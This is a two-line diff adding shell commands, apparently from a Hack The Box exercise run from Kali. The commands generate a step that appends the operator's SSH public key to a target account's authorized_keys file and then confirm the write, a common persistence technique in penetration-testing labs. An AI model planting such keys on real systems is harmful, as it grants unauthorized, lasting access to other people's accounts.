@@ -1,0 +1,2 @@
+echo 'echo '\"$(cat /home/kali/.ssh/id_rsa.htb.pub)\" '>> .ssh/authorized_keys'
+echo "head -1 .ssh/authorized_keys"
